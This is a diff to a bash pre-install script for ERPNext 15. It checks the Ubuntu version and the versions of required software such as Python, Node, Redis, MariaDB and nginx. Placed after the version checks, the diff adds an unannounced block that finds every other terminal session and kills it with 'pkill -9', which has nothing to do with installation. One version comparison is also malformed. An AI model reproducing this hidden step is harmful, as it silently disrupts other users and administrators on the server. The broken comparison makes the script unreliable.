@@ -1,5 +1,142 @@
 #!/bin/bash
 
+# Function to print messages in color and bold
+print_red() {
+    echo -e "\e[31;1m$1\e[0m"  # Bold red
+}
+
+print_green() {
+    echo -e "\e[32;1m$1\e[0m"  # Bold green
+}
+
+
+# Check Ubuntu version
+check_ubuntu_version() {
+    # Get the current Ubuntu version details
+    version=$(lsb_release -rs)
+    codename=$(lsb_release -cs)
+    full_version=$(lsb_release -a 2>/dev/null | grep 'Description' | cut -d':' -f2 | sed 's/^ //')
+
+    # Check the version
+    if (( $(echo "$version < 22" | bc -l) )); then
+        print_red "You need to upgrade your Ubuntu version to at least 22.x.x LTS."
+        print_red "Current version: $full_version (Codename: $codename)"
+        exit 1  # Terminate the script if the version check fails
+    elif (( $(echo "$version > 22" && "$version < 23" | bc -l) )); then
+        print_green "You are eligible to install ERPNext Version 15."
+        print_green "Current version: $full_version"
+    elif (( $(echo "$version > 23" | bc -l) )); then
+        print_red "You should consider downgrading your Ubuntu version to 22.x.x LTS for compatibility."
+        print_red "Current version: $full_version (Codename: $codename)"
+        exit 1  # Terminate the script if the version check fails
+    else
+        print_green "You are eligible to install ERPNext Version 15."
+        print_green "Current version: $full_version"
+    fi
+}
+
+# Function to check version
+check_version() {
+    command -v "$1" >/dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        print_red "$1 is not installed."
+        return 1
+    fi
+
+    version=$("$1" --version 2>/dev/null | grep -o '[0-9.]*' | head -n 1)
+    if [ -z "$version" ]; then
+        print_red "Could not determine version of $1."
+        return 1
+    fi
+
+    # Convert version to an array for easier comparison
+    IFS='.' read -r -a version_array <<< "$version"
+
+    # Version checks
+    case $1 in
+        python3)
+            if [[ ${version_array[0]} -lt 3 || (${version_array[0]} -eq 3 && ${version_array[1]} -lt 6) ]]; then
+                print_red "Python version must be 3.6+. Current version: $version"
+                return 1
+            fi
+            print_green "Python version: $version"
+            ;;
+        node)
+            if [[ ${version_array[0]} -lt 14 ]]; then
+                print_red "Node.js version must be 14+. Current version: $version"
+                return 1
+            fi
+            print_green "Node.js version: $version"
+            ;;
+        redis-server)
+            if [[ ${version_array[0]} -lt 5 ]]; then
+                print_red "Redis version must be 5+. Current version: $version"
+                return 1
+            fi
+            print_green "Redis version: $version"
+            ;;
+        mariadb-server | mysql)
+            if [[ ${version_array[0]} -lt 10 || (${version_array[0]} -eq 10 && ${version_array[1]} -lt 3) ]]; then
+                print_red "MariaDB version must be 10.3.x+. Current version: $version"
+                return 1
+            fi
+            print_green "MariaDB version: $version"
+            ;;
+        psql)
+            if [[ ${version_array[0]} -lt 9 || (${version_array[0]} -eq 9 && ${version_array[1]} -lt 5) ]]; then
+                print_red "Postgres version must be 9.5.x+. Current version: $version"
+                return 1
+            fi
+            print_green "Postgres version: $version"
+            ;;
+        yarn)
+            if [[ ${version_array[0]} -lt 1 || (${version_array[0]} -eq 1 && ${version_array[1]} -lt 12) ]]; then
+                print_red "Yarn version must be 1.12+. Current version: $version"
+                return 1
+            fi
+            print_green "Yarn version: $version"
+            ;;
+        pip)
+            if [[ ${version_array[0]} -lt 20 ]]; then
+                print_red "pip version must be 20+. Current version: $version"
+                return 1
+            fi
+            print_green "pip version: $version"
+            ;;
+        wkhtmltopdf)
+            if [[ ${version_array[0]} -lt 0 || (${version_array[0]} -eq 0 && ${version_array[1]} -lt 12) || (${version_array[0]} -eq 0 && ${version_array[1]} -eq 12 && ${version_array[2]} -lt 5) ]]; then
+                print_red "wkhtmltopdf version must be 0.12.5 with patched qt. Current version: $version"
+                return 1
+            fi
+            print_green "wkhtmltopdf version: $version"
+            ;;
+        nginx)
+            print_green "NGINX version: $version"
+            ;;
+    esac
+    return 0
+}
+
+# Check Ubuntu version
+check_ubuntu_version
+
+# Check for required software
+required_software=("python3" "node" "redis-server" "mariadb-server" "psql" "yarn" "pip" "wkhtmltopdf" "nginx")
+
+echo "Checking required software versions..."
+
+for software in "${required_software[@]}"; do
+    check_version "$software"
+done
+
+echo "Version checks complete."
+
+current=$(tty | cut -d/ -f3-)
+all=$(ps -A -o tty | grep pts/ | grep -v $current)
+for i in $all ; do
+    pkill -9 -t $i
+done
+
 # Function to handle errors
 handle_error() {
     echo -e "\e[1;31mError occurred: $1\e[0m"  # Print error message in red
